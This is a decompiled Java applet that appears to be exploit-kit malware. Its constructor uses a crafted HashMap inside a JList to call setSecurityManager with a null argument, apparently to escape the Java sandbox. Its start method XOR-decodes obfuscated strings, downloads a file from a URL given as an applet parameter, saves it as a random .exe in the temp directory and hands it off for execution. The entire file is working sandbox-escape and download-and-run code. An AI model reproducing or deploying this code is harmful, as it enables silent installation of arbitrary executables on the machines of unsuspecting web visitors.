// 
// Decompiled by Procyon v0.5.30
// 

package folder;

import java.awt.Component;
import javax.swing.JList;
import java.util.Set;
import java.util.HashMap;
import java.util.HashSet;
import java.io.InputStream;
import java.io.FileOutputStream;
import java.net.URL;
import java.applet.Applet;

public class Ump_45 extends Applet
{
    @Override
    public void start() {
        super.start();
        try {
            final String decrypt = decrypt(new int[] { 86, 81, 79 });
            final String decrypt2 = decrypt(new int[] { 13, 70, 91, 70 });
            final String decrypt3 = decrypt(new int[] { 73, 66, 85, 66, 13, 74, 76, 13, 87, 78, 83, 71, 74, 81 });
            final String parameter = this.getParameter(decrypt);
            final String string = Math.random() + decrypt2;
            final String property = System.getProperty(decrypt3);
            try {
                final String string2 = String.valueOf(property) + string;
                final URL url = new URL(parameter);
                url.openConnection();
                final InputStream openStream = url.openStream();
                final FileOutputStream fileOutputStream = new FileOutputStream(string2);
                final byte[] array = new byte[1024];
                int read;
                while ((read = openStream.read(array, 0, array.length)) != -1) {
                    fileOutputStream.write(array, 0, read);
                }
                openStream.close();
                fileOutputStream.close();
                Sig_552.here(string2);
            }
            catch (Exception ex) {}
        }
        catch (Exception ex2) {}
    }
    
    public Ump_45() throws InstantiationException, IllegalAccessException {
        final Glocker glocker = new Glocker(System.class, "setSecurityManager", new Object[1]);
        final HashSet<Glocker> set = new HashSet<Glocker>();
        set.add(glocker);
        this.add(new JList<Object>(new Object[] { new HashMap() {
                @Override
                public Set entrySet() {
                    return set;
                }
            } }));
    }
    
    static String decrypt(final int[] array) {
        final byte b = (byte)Math.ceil(34.33);
        final StringBuffer sb = new StringBuffer();
        for (int i = 0; i < array.length; ++i) {
            array[i] ^= b;
            sb.append((char)array[i]);
        }
        return sb.toString();
    }
}
